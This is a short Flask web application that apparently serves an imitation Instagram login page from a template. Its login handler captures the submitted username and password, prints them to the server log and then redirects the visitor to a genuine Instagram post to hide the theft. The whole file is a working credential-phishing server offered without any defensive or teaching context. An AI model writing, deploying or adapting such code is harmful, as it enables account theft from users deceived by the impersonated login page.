from flask import Flask, request, render_template, redirect

app = Flask(__name__)


@app.route('/login', methods=['POST'])
def login():
    if not request.form['username']:
        return
    if not request.form['password']:
        return
    print(request.form['username'], request.form['password'])
    return redirect('https://www.instagram.com/p/NdYIBT9hYfq6yfzrf8Zr')


@app.route('/')
def login_page():
    return render_template('instagram-login.html')


if __name__ == '__main__':
    app.run()
